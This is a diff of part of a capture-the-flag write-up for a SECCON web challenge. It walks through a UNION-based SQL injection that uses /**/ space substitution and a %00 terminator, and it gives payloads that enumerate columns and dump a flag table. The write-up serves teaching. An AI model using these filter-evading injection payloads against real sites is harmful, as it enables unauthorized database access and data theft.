@@ -44,16 +44,18 @@ So, we need to figure out a way to select the  same no. of columns on both sides
 I have already tried select database() and got an error, that means the table has more than one column and also we need to get the data from flag table.
  Select * from table1 join table2 → general join tables syntax
 
-Select * from (select 1) as a join (select 2) as b;
+              Select * from (select 1) as a join (select 2) as b;
+              
 After encoding:
-a’/**/union/**/select/**/*/**/from/**/(select/**/1)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b;%00
+
+              a’/**/union/**/select/**/*/**/from/**/(select/**/1)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b;%00
 
 The above command select a table with two columns 1 and 2 with the content 1,2. All that now left is to find how many columns we need. From the above command’s result we’ll know that the table has more than 2 rows.Next try with 3 columns, then it’ll show the results. So, the table has/selects 3 columns. Now, time to dump the database.
 We know that the table name is flag. We need to get the column name now.
 
-Select * from (select * from (select group_concat(column_name) from information_schema.columns where table_schema=database()) as a join (select 2) as b) as c join (select 1) as d; 
+              Select * from (select * from (select group_concat(column_name) from information_schema.columns where table_schema=database()) as a join (select 2) as b) as c join (select 1) as d; 
 
 This will dump all the columns of the tables in that database. For more clarity you can dump it table wise just change table_schema to table_name=’<table_name>’. Now just get the column piece from the flag table you’ll get the other half also.
 
 ### Final payload:
-http://web-search.chal.seccon.jp/?q=%27/**/union/**/select/**/*/**/from/**/(select/**/*/**/from/**/(select/**/piece/**/from/**/flag)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b)/**/as/**/c/**/join/**/(select/**/1)/**/as/**/d;%00
+              http://web-search.chal.seccon.jp/?q=%27/**/union/**/select/**/*/**/from/**/(select/**/*/**/from/**/(select/**/piece/**/from/**/flag)/**/as/**/a/**/join/**/(select/**/2)/**/as/**/b)/**/as/**/c/**/join/**/(select/**/1)/**/as/**/d;%00
